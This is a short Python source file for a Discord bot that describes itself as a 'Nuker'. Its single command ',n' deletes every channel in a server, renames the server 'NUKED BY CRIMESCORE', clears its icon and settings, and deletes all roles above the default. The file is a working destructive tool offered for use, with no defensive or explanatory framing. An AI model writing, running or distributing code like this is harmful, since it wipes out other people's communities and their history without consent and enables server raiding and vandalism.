#Bot created by PurpleProfessional
#Please do not change the name and claim that the file is yours.

import discord
from discord.ext import commands
import time
import logging

intents = discord.Intents.default()
intents.message_content = True #v2
intents.members = True 

prefix = ','

client = commands.Bot(command_prefix=prefix, case_insensitive=True, intents=intents)

client.remove_command("help")

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    else:
        raise error

@client.event
async def on_ready():
    print("Nuker Successfully running.")
    print(f"Logged into {len(client.guilds)} servers.")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"crimescores demands"))

@client.event
async def on_guild_join(server):
    print(f"Joining {server.name}")

@client.command()
async def n(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as E:
            print(E)
            continue
    await ctx.guild.edit(name="NUKED BY CRIMESCORE", icon=None, rules_channel=None, public_updates_channel=None, system_channel=None)
    for role in ctx.guild.roles:
        if not role.position == 0:
            print(role.name)
            try:
                await role.delete()
            except:
                continue

client.run("TOKEN HERE")
